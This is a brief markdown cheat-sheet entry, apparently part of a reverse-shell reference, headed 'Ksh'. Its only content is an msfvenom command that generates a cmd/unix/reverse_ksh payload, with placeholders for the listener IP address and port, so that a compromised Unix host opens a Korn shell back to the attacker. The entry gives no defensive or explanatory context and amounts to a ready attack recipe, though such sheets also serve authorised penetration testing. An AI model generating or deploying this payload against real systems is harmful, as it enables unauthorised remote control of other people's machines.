# Ksh

## 01 - Generate a payload via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_ksh lhost=<IP> lport=<PORT>
```